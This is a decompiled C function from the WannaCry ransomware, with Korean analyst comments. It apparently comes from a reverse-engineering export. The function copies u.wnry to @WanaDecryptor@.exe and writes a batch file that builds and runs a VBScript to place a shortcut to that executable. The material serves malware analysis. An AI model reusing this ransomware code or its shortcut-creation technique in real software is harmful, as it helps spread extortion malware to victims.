// --- Metadata ---
// Function Name: EnsureWanaDecryptorAndShortcut_10004CD0
// Address: 0x10004CD0
// Exported At: 20250522_105514
// Signature: unknown_signature
// ---------------
DWORD EnsureWanaDecryptorAndShortcut_10004CD0()
{
  DWORD result; // eax
  char v1; // [esp+3h] [ebp-6CDh]
  CHAR Buffer; // [esp+4h] [ebp-6CCh] BYREF
  char v3[516]; // [esp+5h] [ebp-6CBh] BYREF
  __int16 v4; // [esp+209h] [ebp-4C7h]
  char v5; // [esp+20Bh] [ebp-4C5h]
  char Format[1220]; // [esp+20Ch] [ebp-4C4h] BYREF

  if ( GetFileAttributesW(L"@WanaDecryptor@.exe") == -1 )// "u.wnry" 파일을 @WanaDecryptor@.exe로 복사 
    CopyFileA("u.wnry", "@WanaDecryptor@.exe", 0);
  result = GetFileAttributesW(L"@WanaDecryptor@.exe.lnk");// VBScript는 현재 디렉터리에 @WanaDecryptor@.exe.lnk 바로가기를 생성 
  if ( result == -1 )
  {
    strcpy(
      Format,
      "@echo off\r\n"
      "echo SET ow = WScript.CreateObject(\"WScript.Shell\")> m.vbs\r\n"
      "echo SET om = ow.CreateShortcut(\"%s%s\")>> m.vbs\r\n"
      "echo om.TargetPath = \"%s%s\">> m.vbs\r\n"
      "echo om.Save>> m.vbs\r\n"
      "cscript.exe //nologo m.vbs\r\n"
      "del m.vbs\r\n");
    Buffer = byte_1000DD98;
    memset(v3, 0, sizeof(v3));
    v4 = 0;
    v5 = 0;
    GetCurrentDirectoryA(0x208u, &Buffer);
    if ( strlen(&Buffer) )
    {
      if ( *(&v1 + strlen(&Buffer)) != 92 )
        strcat(&Buffer, "\\");
    }
    sprintf(&Format[220], Format, &Buffer, "@WanaDecryptor@.exe.lnk", &Buffer, "@WanaDecryptor@.exe");
    result = (DWORD)CreateAndRunTempBatchFile_10001140(&Format[220]);
  }
  return result;
}
